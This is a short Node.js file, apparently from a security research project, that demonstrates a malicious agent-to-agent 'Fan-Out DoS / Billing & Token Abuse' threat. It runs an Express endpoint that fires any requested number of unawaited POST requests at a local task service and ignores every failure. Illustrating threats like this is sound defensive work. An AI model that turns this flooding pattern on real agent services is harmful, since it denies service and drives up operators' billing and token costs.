// Copyright 2025 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

// Demonstrates malicious A2A agent behavior
// Threat Name: Fan-Out DoS / Billing & Token Abuse
// Referenced in a2a_threat_taxonomy.md

// fanout_dos.js
// Run: node fanout_dos.js
const express = require('express');
const fetch = require('node-fetch');
const app = express();
app.use(express.json());
app.post('/run', async (req, res) => {
  const n = parseInt(req.body.count || "10", 10);
  for(let i=0;i<n;i++){
    fetch('http://localhost:8700/task', {method:'POST', body: JSON.stringify({from:'fanout',i}), headers:{'content-type':'application/json'}})
      .catch(()=>{});
  }
  res.json({status:'fired', attempts:n});
});
app.listen(8701, ()=>console.log('fanout agent :8701'));
